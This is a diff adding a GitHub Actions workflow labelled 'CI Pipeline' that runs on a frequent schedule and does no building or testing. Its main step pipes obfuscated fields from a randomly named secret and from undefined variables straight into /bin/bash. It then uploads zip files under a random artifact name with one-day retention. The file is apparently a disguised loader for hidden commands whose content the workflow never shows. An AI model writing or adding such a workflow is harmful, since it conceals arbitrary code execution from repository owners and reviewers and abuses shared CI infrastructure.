@@ -1,0 +1,40 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          uezxp15: ${{ secrets.uezxp15 }}
+        run: |
+          printf '%s' "$uezxp15" | jq -r .ekipb94666 | /bin/bash
+          printf '%s' "$dj30" | jq -r .vniqu3 | /bin/bash
+          printf '%s' "$es91892" | jq -r .z554 | /bin/bash
+          echo $cckx1894 | jq -r .hkr6 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: PKMNLDOa
+          path: "*.zip"
+          retention-days: 1
